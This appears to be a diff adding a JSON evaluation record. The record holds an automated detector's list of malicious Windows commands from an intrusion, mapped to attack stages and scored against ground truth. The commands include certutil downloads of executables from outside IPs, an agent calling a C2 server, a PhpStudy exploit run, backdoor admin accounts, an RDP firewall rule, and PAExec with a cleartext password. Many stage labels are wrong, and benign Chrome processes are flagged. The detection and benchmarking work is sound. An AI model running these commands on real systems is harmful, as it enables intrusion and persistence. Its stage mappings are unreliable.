@@ -1,0 +1,144 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\99.279.200\\software_reporter_tool.exe --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=YzNf24YYZfuvRHVbjuMFf3GpplnJ+CDak8V6SAZz --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\99.279.200\\software_reporter_tool.exe --crash-handler \"--database:c:\\users\\administrator\\appdata\\local\\Google\\Software Reporter Tool\" --url=https://clients2.google.com/cr/report --annotation=plat=Win32 --annotation=prod=ChromeFoil --annotation=ver=99.279.200 --initial-client-data=0x1c0,0x1c4,0x1c8,0x19c,0x1cc,0x7ff763b525a0,0x7ff763b525b0,0x7ff763b525c0",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=38 --launch-time-ticks=1219013486760 --mojo-platform-channel-handle=4276 --field-trial-handle=1296,i,11587666201893271414,3480847453956030777,131072 /prefetch:1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\99.279.200\\software_reporter_tool.exe --enable-crash-reporting --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=2 --init-done-notifier=600 --sandbox-mojo-pipe-token=10875049845061253074 --mojo-platform-channel-handle=568 --engine=2",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "REG query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "dir C:\\Users\\Public\\PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "\"PAExec.exe  \\192.168.0.244 -u administrator -p Data123456! ipconfig\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "nbtscan.exe  192.168.0.244/24",
+        "stage": "Discovery"
+      },
+      {
+        "command": "'C:\\Windows\\system32\\cmd.exe'  /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Execution"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule name='Remote Desktop' dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "net.exe user oop o33 /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net.exe user Administrator Data321!",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d \"D:/phpStudy/WWW\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"cd /d \"D:/phpStudy/WWW\"&C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "net.exe user oop o33 /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "netstat -ano | findstr 88",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attacker initiated contact via several vectors and exploitation tools, employed techniques to evade detection, access systems, create persistence, escalate permissions, gather data, transmit collected info across networks, and perform actions remotely.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37314,
+      "completion_tokens": 4640,
+      "total_tokens": 41954,
+      "wall_clock_s": 94.626,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.28,
+      "recall": 0.7777777777777778,
+      "f1": 0.4117647058823529,
+      "tp": 7,
+      "fp": 18,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.12,
+      "recall": 0.42857142857142855,
+      "f1": 0.1875,
+      "tp": 3,
+      "fp": 22,
+      "fn": 4,
+      "recall_partial": 0.5
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37314,
+      "completion_tokens": 4640,
+      "total_tokens": 41954,
+      "wall_clock_s": 94.626,
+      "parse_retries": 1
+    }
+  }
+}
